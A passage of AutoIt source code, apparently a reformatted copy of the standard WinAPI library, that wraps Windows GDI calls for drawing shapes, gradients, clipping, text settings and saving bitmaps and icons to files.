        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        If $acall[0x0] = + -1 Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PtVisible

    Func _WinAPI_RadialGradientFill($hdc, $ix, $iy, $iradius, $irgb1, $irgb2, $fanglestart = 0x0, $fangleend = 0x168, $fstep = 0x5)
        If Abs($fanglestart) > 0x168 Then
            $fanglestart = Mod($fanglestart, 0x168)
        EndIf
        If Abs($fangleend) > 0x168 Then
            $fangleend = Mod($fangleend, 0x168)
        EndIf
        If ($fanglestart < 0x0) Or ($fangleend < 0x0) Then
            $fanglestart += 0x168
            $fangleend += 0x168
        EndIf
        If $fanglestart > $fangleend Then
            Local $fval = $fanglestart
            $fanglestart = $fangleend
            $fangleend = $fval
        EndIf
        If $fstep < 0x1 Then
            $fstep = 0x1
        EndIf
        Local $fki = ATan(0x1) / 0x2d
        Local $ixp = Round($ix + $iradius * Cos($fki * $fanglestart))
        Local $iyp = Round($iy + $iradius * Sin($fki * $fanglestart))
        Local $ixn, $iyn, $fan = $fanglestart
        Local $AVERTEX[0x3][0x3]
        While $fan < $fangleend
            $fan += $fstep
            If $fan > $fangleend Then
                $fan = $fangleend
            EndIf
            $ixn = Round($ix + $iradius * Cos($fki * $fan))
            $iyn = Round($iy + $iradius * Sin($fki * $fan))
            $AVERTEX[0x0][0x0] = $ix
            $AVERTEX[0x0][0x1] = $iy
            $AVERTEX[0x0][0x2] = $irgb1
            $AVERTEX[0x1][0x0] = $ixp
            $AVERTEX[0x1][0x1] = $iyp
            $AVERTEX[0x1][0x2] = $irgb2
            $AVERTEX[0x2][0x0] = $ixn
            $AVERTEX[0x2][0x1] = $iyn
            $AVERTEX[0x2][0x2] = $irgb2
            If Not _WinAPI_GradientFill($hdc, $AVERTEX, 0x0, 0x2) Then
                Return SetError(@error, @extended, 0x0)
            EndIf
            $ixp = $ixn
            $iyp = $iyn
        WEnd
        Return 0x1
    EndFunc    ; -> _WinAPI_RadialGradientFill

    Func _WinAPI_Rectangle($hdc, $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "Rectangle", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_Rectangle

    Func _WinAPI_RectInRegion($hrgn, $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "RectInRegion", "handle", $hrgn, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RectInRegion

    Func _WinAPI_RectIsEmpty(ByRef $trect)
        Return (DllStructGetData($trect, "Left") = 0x0) And (DllStructGetData($trect, "Top") = 0x0) And (DllStructGetData($trect, "Right") = 0x0) And (DllStructGetData($trect, "Bottom") = 0x0)
    EndFunc    ; -> _WinAPI_RectIsEmpty

    Func _WinAPI_RectVisible($hdc, $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "RectVisible", "handle", $hdc, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Switch $acall[0x0]
        Case 0x0, 0x1, 0x2
        Case Else
            Return SetError(0xa, $acall[0x0], 0x0)
        EndSwitch
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RectVisible

    Func _WinAPI_RemoveFontMemResourceEx($hfont)
        Local $acall = DllCall("gdi32.dll", "bool", "RemoveFontMemResourceEx", "handle", $hfont)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RemoveFontMemResourceEx

    Func _WinAPI_RemoveFontResourceEx($sfont, $iflag = 0x0, $bnotify = False)
        Local $acall = DllCall("gdi32.dll", "bool", "RemoveFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        If $bnotify Then
            Local Const $WM_FONTCHANGE = 0x1d
            Local Const $HWND_BROADCAST = 0xffff
            DllCall("user32.dll", "none", "SendMessage", "hwnd", $HWND_BROADCAST, "uint", $WM_FONTCHANGE, "wparam", 0x0, "lparam", 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RemoveFontResourceEx

    Func _WinAPI_RGB($ired, $igreen, $iblue)
        Return __rgb(BitOR(BitShift($iblue, + -16), BitShift($igreen, + -8), $ired))
    EndFunc    ; -> _WinAPI_RGB

    Func _WinAPI_RotatePoints(ByRef $APOINT, $ixc, $iyc, $fangle, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2) Then Return SetError(@error + 0xa, @extended, 0x0)
        If UBound($APOINT, $UBOUND_COLUMNS) < 0x2 Then Return SetError(0xd, 0x0, 0x0)
        Local $fcos = Cos(ATan(0x1) / 0x2d * $fangle)
        Local $fsin = Sin(ATan(0x1) / 0x2d * $fangle)
        Local $ixn, $iyn
        For $i = $ISTART To $IEND
            $ixn = $APOINT[$i][0x0] - $ixc
            $iyn = $APOINT[$i][0x1] - $iyc
            $APOINT[$i][0x0] = $ixc + Round($ixn * $fcos - $iyn * $fsin)
            $APOINT[$i][0x1] = $iyc + Round($ixn * $fsin + $iyn * $fcos)
        Next
        Return 0x1
    EndFunc    ; -> _WinAPI_RotatePoints

    Func _WinAPI_RoundRect($hdc, $trect, $iwidth, $iheight)
        Local $acall = DllCall("gdi32.dll", "bool", "RoundRect", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4), "int", $iwidth, "int", $iheight)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RoundRect

    Func _WinAPI_SaveHBITMAPToFile($sfilepath, $hbitmap, $ixpelspermeter = Default, $iypelspermeter = Default)
        Local $tbmp = DllStructCreate("align 1;ushort bfType;dword bfSize;ushort bfReserved1;ushort bfReserved2;dword bfOffset")
        Local $tdib = DllStructCreate($TAGDIBSECTION)
        Local $hdc, $hsv, $hsource = 0x0
        While $hbitmap
            If (Not _WinAPI_GetObject($hbitmap, DllStructGetSize($tdib), $tdib)) Or (DllStructGetData($tdib, "biCompression")) Then
                $hbitmap = 0x0
            Else
                Switch DllStructGetData($tdib, "bmBitsPixel")
                Case 0x20
                    If Not _WinAPI_IsAlphaBitmap($hbitmap) Then
                        If Not $hsource Then
                            $hsource = _WinAPI_CreateDIB(DllStructGetData($tdib, "bmWidth"), DllStructGetData($tdib, "bmHeight"), 0x18)
                            If Not $hsource Then
                                $hbitmap = 0x0
                            EndIf
                            $hdc = _WinAPI_CreateCompatibleDC(0x0)
                            $hsv = _WinAPI_SelectObject($hdc, $hsource)
                            If _WinAPI_DrawBitmap($hdc, 0x0, 0x0, $hbitmap) Then
                                $hbitmap = $hsource
                            Else
                                $hbitmap = 0x0
                            EndIf
                            _WinAPI_SelectObject($hdc, $hsv)
                            _WinAPI_DeleteDC($hdc)
                        Else
                            $hbitmap = 0x0
                        EndIf
                        ContinueLoop
                    EndIf
                Case Else
                EndSwitch
                If (Not DllStructGetData($tdib, "bmBits")) Or (Not DllStructGetData($tdib, "biSizeImage")) Then
                    If Not $hsource Then
                        $hbitmap = _WinAPI_CopyBitmap($hbitmap)
                        $hsource = $hbitmap
                    Else
                        $hbitmap = 0x0
                    EndIf
                Else
                    ExitLoop
                EndIf
            EndIf
        WEnd
        Local $hfile = 0x0, $ierror = 0x0, $iresult = 0x0
        Do
            If Not $hbitmap Then
                $ierror = 0x1
                ExitLoop
            EndIf
            Local $ADATA[0x4][0x2]
            $ADATA[0x0][0x0] = DllStructGetPtr($tbmp)
            $ADATA[0x0][0x1] = DllStructGetSize($tbmp)
            $ADATA[0x1][0x0] = DllStructGetPtr($tdib, "biSize")
            $ADATA[0x1][0x1] = 0x28
            $ADATA[0x2][0x1] = DllStructGetData($tdib, "biClrUsed") * 0x4
            Local $ttable = 0x0
            If $ADATA[0x2][0x1] Then
                $ttable = _WinAPI_GetDIBColorTable($hbitmap)
                If @error Or (@extended <> $ADATA[0x2][0x1] / 0x4) Then
                    $ierror = @error + 0xa
                    ExitLoop
                EndIf
            EndIf
            $ADATA[0x2][0x0] = DllStructGetPtr($ttable)
            $ADATA[0x3][0x0] = DllStructGetData($tdib, "bmBits")
            $ADATA[0x3][0x1] = DllStructGetData($tdib, "biSizeImage")
            DllStructSetData($tbmp, "bfType", 0x4d42)
            DllStructSetData($tbmp, "bfSize", $ADATA[0x0][0x1] + $ADATA[0x1][0x1] + $ADATA[0x2][0x1] + $ADATA[0x3][0x1])
            DllStructSetData($tbmp, "bfReserved1", 0x0)
            DllStructSetData($tbmp, "bfReserved2", 0x0)
            DllStructSetData($tbmp, "bfOffset", $ADATA[0x0][0x1] + $ADATA[0x1][0x1] + $ADATA[0x2][0x1])
            $hdc = _WinAPI_GetDC(0x0)
            If $ixpelspermeter = Default Then
                If Not DllStructGetData($tdib, "biXPelsPerMeter") Then
                    DllStructSetData($tdib, "biXPelsPerMeter", _WinAPI_GetDeviceCaps($hdc, 0x8) / _WinAPI_GetDeviceCaps($hdc, 0x4) * 0x3e8)
                EndIf
            Else
                DllStructSetData($tdib, "biXPelsPerMeter", $ixpelspermeter)
            EndIf
            If $iypelspermeter = Default Then
                If Not DllStructGetData($tdib, "biYPelsPerMeter") Then
                    DllStructSetData($tdib, "biYPelsPerMeter", _WinAPI_GetDeviceCaps($hdc, 0xa) / _WinAPI_GetDeviceCaps($hdc, 0x6) * 0x3e8)
                EndIf
            Else
                DllStructSetData($tdib, "biYPelsPerMeter", $iypelspermeter)
            EndIf
            _WinAPI_ReleaseDC(0x0, $hdc)
            $hfile = _WinAPI_CreateFile($sfilepath, 0x1, 0x4)
            If @error Then
                $ierror = @error + 0x14
                ExitLoop
            EndIf
            Local $ibytes
            For $i = 0x0 To 0x3
                If $ADATA[$i][0x1] Then
                    If Not _WinAPI_WriteFile($hfile, $ADATA[$i][0x0], $ADATA[$i][0x1], $ibytes) Then
                        $ierror = @error + 0x1e
                        ExitLoop 0x2
                    EndIf
                EndIf
            Next
            $iresult = 0x1
        Until 0x1
        If $hsource Then
            _WinAPI_DeleteObject($hsource)
        EndIf
        _WinAPI_CloseHandle($hfile)
        If Not $iresult Then
            FileDelete($sfilepath)
        EndIf
        Return SetError($ierror, 0x0, $iresult)
    EndFunc    ; -> _WinAPI_SaveHBITMAPToFile

    Func _WinAPI_SaveHICONToFile($sfilepath, Const ByRef $VICON, $BCOMPRESS = 0x0, $ISTART = 0x0, $IEND = + -1)
        Local $aicon, $atemp, $icount = 0x1
        If Not IsArray($VICON) Then
            Dim $aicon[0x1] = [$VICON]
            Dim $atemp[0x1] = [0x0]
        Else
            If __CheckErrorArrayBounds($VICON, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
            $icount = $IEND - $ISTART + 0x1
            If $icount Then
                Dim $aicon[$icount]
                Dim $atemp[$icount]
                For $i = 0x0 To $icount + -1
                    $aicon[$i] = $VICON[$ISTART + $i]
                    $atemp[$i] = 0x0
                Next
            EndIf
        EndIf
        Local $hfile = _WinAPI_CreateFile($sfilepath, 0x1, 0x4)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tico = DllStructCreate("align 1;ushort Reserved;ushort Type;ushort Count;byte Data[" & (0x10 * $icount) & "]")
        Local $ilength = DllStructGetSize($tico)
        Local $tbi = DllStructCreate($TAGBITMAPINFOHEADER)
        Local $tii = DllStructCreate($TAGICONINFO)
        Local $tdib = DllStructCreate($TAGDIBSECTION)
        Local $idib = DllStructGetSize($tdib)
        Local $pdib = DllStructGetPtr($tdib)
        Local $ioffset = $ilength
        DllStructSetData($tbi, "biSize", 0x28)
        DllStructSetData($tbi, "biPlanes", 0x1)
        DllStructSetData($tbi, "biXPelsPerMeter", 0x0)
        DllStructSetData($tbi, "biYPelsPerMeter", 0x0)
        DllStructSetData($tbi, "biClrUsed", 0x0)
        DllStructSetData($tbi, "biClrImportant", 0x0)
        DllStructSetData($tico, "Reserved", 0x0)
        DllStructSetData($tico, "Type", 0x1)
        DllStructSetData($tico, "Count", $icount)
        Local $iresult = 0x0, $ierror = 0x0, $ibytes
        Local $ainfo[0x8], $acall, $pdata = 0x0, $iindex = 0x0
        Local $asize[0x2], $tdata = 0x0
        Do
            If Not _WinAPI_WriteFile($hfile, $tico, $ilength, $ibytes) Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            While $icount > $iindex
                $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $aicon[$iindex], "struct*", $tii)
                If @error Or Not $acall[0x0] Then
                    $ierror = @error + 0x28
                    ExitLoop 0x2
                EndIf
                For $i = 0x4 To 0x5
                    $ainfo[$i] = _WinAPI_CopyImage(DllStructGetData($tii, $i), 0x0, 0x0, 0x0, 0x2008)
                    If _WinAPI_GetObject($ainfo[$i], $idib, $pdib) Then
                        $ainfo[$i + -4] = DllStructGetData($tdib, "biSizeImage")
                        $ainfo[$i + -2] = DllStructGetData($tdib, "bmBits")
                    Else
                        $ierror = @error + 0x32
                    EndIf
                Next
                $ainfo[0x6] = 0x28
                $ainfo[0x7] = DllStructGetData($tdib, "bmBitsPixel")
                Switch $ainfo[0x7]
                Case 0x10, 0x18
                Case 0x20
                    If Not _WinAPI_IsAlphaBitmap($ainfo[0x5]) Then
                        If Not $atemp[$iindex] Then
                            $aicon[$iindex] = _WinAPI_Create32BitHICON($aicon[$iindex])
                            $atemp[$iindex] = $aicon[$iindex]
                            If Not @error Then
                                ContinueLoop
                            Else
                                ContinueCase
                            EndIf
                        EndIf
                    Else
                        If ($ainfo[0x1] >= 0x100 * 0x100 * 0x4) And ($BCOMPRESS) Then
                            $ibytes = _WinAPI_CompressBitmapBits($ainfo[0x5], $pdata)
                            If Not @error Then
                                $ainfo[0x0] = 0x0
                                $ainfo[0x1] = $ibytes
                                $ainfo[0x2] = 0x0
                                $ainfo[0x3] = $pdata
                                $ainfo[0x6] = 0x0
                            EndIf
                        EndIf
                    EndIf
                Case Else
                    $ierror = 0x3c
                EndSwitch
                If Not $ierror Then
                    $tdata = DllStructCreate("byte Width;byte Height;byte ColorCount;byte Reserved;ushort Planes;ushort BitCount;long Size;long Offset", DllStructGetPtr($tico) + 0x6 + 0x10 * $iindex)
                    DllStructSetData($tdata, "ColorCount", 0x0)
                    DllStructSetData($tdata, "Reserved", 0x0)
                    DllStructSetData($tdata, "Planes", 0x1)
                    DllStructSetData($tdata, "BitCount", $ainfo[0x7])
                    DllStructSetData($tdata, "Size", $ainfo[0x0] + $ainfo[0x1] + $ainfo[0x6])
                    DllStructSetData($tdata, "Offset", $ioffset)
                    For $i = 0x0 To 0x1
                        $asize[$i] = DllStructGetData($tdib, $i + 0x2)
                        If $asize[$i] < 0x100 Then
                            DllStructSetData($tdata, $i + 0x1, $asize[$i])
                        Else
                            DllStructSetData($tdata, $i + 0x1, 0x0)
                        EndIf
                    Next
                    DllStructSetData($tbi, "biWidth", $asize[0x0])
                    DllStructSetData($tbi, "biHeight", 0x2 * $asize[0x1])
                    DllStructSetData($tbi, "biBitCount", $ainfo[0x7])
                    DllStructSetData($tbi, "biCompression", 0x0)
                    DllStructSetData($tbi, "biSizeImage", $ainfo[0x0] + $ainfo[0x1])
                    $ioffset += $ainfo[0x0] + $ainfo[0x1] + $ainfo[0x6]
                    Do
                        If $ainfo[0x6] Then
                            If Not _WinAPI_WriteFile($hfile, $tbi, $ainfo[0x6], $ibytes) Then
                                $ierror = @error + 0x46
                                ExitLoop
                            EndIf
                            For $i = 0x1 To 0x0 Step + -1
                                If Not _WinAPI_WriteFile($hfile, $ainfo[$i + 0x2], $ainfo[$i], $ibytes) Then
                                    $ierror = @error + 0x50
                                    ExitLoop 0x2
                                EndIf
                            Next
                        Else
                            If Not _WinAPI_WriteFile($hfile, $ainfo[0x3], $ainfo[0x1], $ibytes) Then
                                $ierror = @error + 0x5a
                                ExitLoop
                            EndIf
                        EndIf
                    Until 0x1
                EndIf
                For $i = 0x4 To 0x5
                    _WinAPI_DeleteObject($ainfo[$i])
                Next
                If $ierror Then
                    ExitLoop 0x2
                EndIf
                $iindex += 0x1
            WEnd
            $acall = DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", 0x0, "int64*", 0x0, "dword", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x64
                ExitLoop
            EndIf
            If Not _WinAPI_WriteFile($hfile, $tico, $ilength, $ibytes) Then
                $ierror = @error + 0x6e
                ExitLoop
            EndIf
            $iresult = 0x1
        Until 0x1
        For $i = 0x0 To $icount + -1
            If $atemp[$i] Then
                _WinAPI_DestroyIcon($atemp[$i])
            EndIf
        Next
        If $pdata Then
            __HeapFree($pdata)
        EndIf
        _WinAPI_CloseHandle($hfile)
        If Not $iresult Then
            FileDelete($sfilepath)
        EndIf
        Return SetError($ierror, 0x0, $iresult)
    EndFunc    ; -> _WinAPI_SaveHICONToFile

    Func _WinAPI_ScaleWindowExt($hdc, $ixnum, $ixdenom, $iynum, $iydenom)
        $__g_vext = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("gdi32.dll", "bool", "ScaleWindowExtEx", "handle", $hdc, "int", $ixnum, "int", $ixdenom, "int", $iynum, "int", $iydenom, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ScaleWindowExt

    Func _WinAPI_SelectClipPath($hdc, $imode = 0x5)
        Local $acall = DllCall("gdi32.dll", "bool", "SelectClipPath", "handle", $hdc, "int", $imode)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SelectClipPath

    Func _WinAPI_SelectClipRgn($hdc, $hrgn)
        Local $acall = DllCall("gdi32.dll", "int", "SelectClipRgn", "handle", $hdc, "handle", $hrgn)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SelectClipRgn

    Func _WinAPI_SetArcDirection($hdc, $idirection)
        Local $acall = DllCall("gdi32.dll", "int", "SetArcDirection", "handle", $hdc, "int", $idirection)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetArcDirection

    Func _WinAPI_SetBitmapBits($hbitmap, $isize, $pbits)
        Local $acall = DllCall("gdi32.dll", "long", "SetBitmapBits", "handle", $hbitmap, "dword", $isize, "struct*", $pbits)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBitmapBits

    Func _WinAPI_SetBitmapDimensionEx($hbitmap, $iwidth, $iheight)
        $__g_vext = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("gdi32.dll", "bool", "SetBitmapDimensionEx", "handle", $hbitmap, "int", $iwidth, "int", $iheight, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBitmapDimensionEx

    Func _WinAPI_SetBoundsRect($hdc, $iflags, $trect = 0x0)
        Local $acall = DllCall("gdi32.dll", "uint", "SetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBoundsRect

    Func _WinAPI_SetBrushOrg($hdc, $ix, $iy)
        $__g_vext = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "SetBrushOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBrushOrg

    Func _WinAPI_SetColorAdjustment($hdc, $tadjustment)
        Local $acall = DllCall("gdi32.dll", "bool", "SetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetColorAdjustment

    Func _WinAPI_SetDCBrushColor($hdc, $irgb)
        Local $acall = DllCall("gdi32.dll", "dword", "SetDCBrushColor", "handle", $hdc, "dword", __rgb($irgb))
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_SetDCBrushColor

    Func _WinAPI_SetDCPenColor($hdc, $irgb)
        Local $acall = DllCall("gdi32.dll", "dword", "SetDCPenColor", "handle", $hdc, "dword", __rgb($irgb))
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_SetDCPenColor

    Func _WinAPI_SetDeviceGammaRamp($hdc, Const ByRef $aramp)
        If (UBound($aramp, $UBOUND_DIMENSIONS) <> 0x2) Or (UBound($aramp, $UBOUND_ROWS) <> 0x100) Or (UBound($aramp, $UBOUND_COLUMNS) <> 0x3) Then
            Return SetError(0xc, 0x0, 0x0)
        EndIf
        Local $tdata = DllStructCreate("ushort[256];ushort[256];ushort[256]")
        For $i = 0x0 To 0x2
            For $j = 0x0 To 0xff
                DllStructSetData($tdata, $i + 0x1, $aramp[$j][$i], $j + 0x1)
            Next
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "SetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDeviceGammaRamp

    Func _WinAPI_SetDIBColorTable($hbitmap, $tcolortable, $icolorcount)
        If $icolorcount > DllStructGetSize($tcolortable) / 0x4 Then Return SetError(0x1, 0x0, 0x0)
        Local $hdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $hsv = _WinAPI_SelectObject($hdc, $hbitmap)
        Local $ierror = 0x0
        Local $acall = DllCall("gdi32.dll", "uint", "SetDIBColorTable", "handle", $hdc, "uint", 0x0, "uint", $icolorcount, "struct*", $tcolortable)
        If @error Then $ierror = @error
        _WinAPI_SelectObject($hdc, $hsv)
        _WinAPI_DeleteDC($hdc)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDIBColorTable

    Func _WinAPI_SetDIBits($hdc, $hbitmap, $istartscan, $iscanlines, $pbits, $tbmi, $icoloruse = 0x0)
        Local $acall = DllCall("gdi32.dll", "int", "SetDIBits", "handle", $hdc, "handle", $hbitmap, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbmi, "INT", $icoloruse)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDIBits

    Func _WinAPI_SetDIBitsToDevice($hdc, $ixdest, $iydest, $iwidth, $iheight, $ixsrc, $iysrc, $istartscan, $iscanlines, $tbitmapinfo, $iusage, $pbits)
        Local $acall = DllCall("gdi32.dll", "int", "SetDIBitsToDevice", "handle", $hdc, "int", $ixdest, "int", $iydest, "dword", $iwidth, "dword", $iheight, "int", $ixsrc, "int", $iysrc, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error + 0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDIBitsToDevice

    Func _WinAPI_SetEnhMetaFileBits($pdata, $ilength)
        Local $acall = DllCall("gdi32.dll", "handle", "SetEnhMetaFileBits", "uint", $ilength, "struct*", $pdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetEnhMetaFileBits

    Func _WinAPI_SetGraphicsMode($hdc, $imode)
        Local $acall = DllCall("gdi32.dll", "int", "SetGraphicsMode", "handle", $hdc, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetGraphicsMode

    Func _WinAPI_SetMapMode($hdc, $imode)
        Local $acall = DllCall("gdi32.dll", "int", "SetMapMode", "handle", $hdc, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetMapMode

    Func _WinAPI_SetPixel($hdc, $ix, $iy, $irgb)
        Local $acall = DllCall("gdi32.dll", "bool", "SetPixelV", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetPixel

    Func _WinAPI_SetPolyFillMode($hdc, $imode = 0x1)
        Local $acall = DllCall("gdi32.dll", "int", "SetPolyFillMode", "handle", $hdc, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetPolyFillMode

    Func _WinAPI_SetRectRgn($hrgn, $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "SetRectRgn", "handle", $hrgn, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetRectRgn

    Func _WinAPI_SetROP2($hdc, $imode)
        Local $acall = DllCall("gdi32.dll", "int", "SetROP2", "handle", $hdc, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetROP2

    Func _WinAPI_SetStretchBltMode($hdc, $imode)
        Local $acall = DllCall("gdi32.dll", "int", "SetStretchBltMode", "handle", $hdc, "int", $imode)
        If @error Or Not $acall[0x0] Or ($acall[0x0] = 0x57) Then Return SetError(@error + 0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetStretchBltMode

    Func _WinAPI_SetTextAlign($hdc, $imode = 0x0)
        Local $acall = DllCall("gdi32.dll", "uint", "SetTextAlign", "handle", $hdc, "uint", $imode)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetTextAlign

    Func _WinAPI_SetTextCharacterExtra($hdc, $icharextra)
        Local $acall = DllCall("gdi32.dll", "int", "SetTextCharacterExtra", "handle", $hdc, "int", $icharextra)
        If @error Or ($acall[0x0] = -2147483648) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetTextCharacterExtra

    Func _WinAPI_SetTextJustification($hdc, $ibreakextra, $ibreakcount)
        Local $acall = DllCall("gdi32.dll", "bool", "SetTextJustification", "handle", $hdc, "int", $ibreakextra, "int", $ibreakcount)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetTextJustification

    Func _WinAPI_SetUDFColorMode($imode)
        $__g_irgbmode = Not ($imode = 0x0)
    EndFunc    ; -> _WinAPI_SetUDFColorMode

    Func _WinAPI_SetWindowExt($hdc, $ixextent, $iyextent)
        $__g_vext = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("gdi32.dll", "bool", "SetWindowExtEx", "handle", $hdc, "int", $ixextent, "int", $iyextent, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowExt

    Func _WinAPI_SetWindowOrg($hdc, $ix, $iy)
        $__g_vext = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "SetWindowOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowOrg

    Func _WinAPI_SetWorldTransform($hdc, ByRef $txform)
        Local $acall = DllCall("gdi32.dll", "bool", "SetWorldTransform", "handle", $hdc, "struct*", $txform)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWorldTransform

    Func _WinAPI_StretchBlt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irop)
        Local $acall = DllCall("gdi32.dll", "bool", "StretchBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $irop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StretchBlt

    Func _WinAPI_StretchDIBits($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $tbitmapinfo, $iusage, $pbits, $irop)
        Local $acall = DllCall("gdi32.dll", "int", "StretchDIBits", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage, "dword", $irop)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error + 0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_StretchDIBits

    Func _WinAPI_StrokeAndFillPath($hdc)
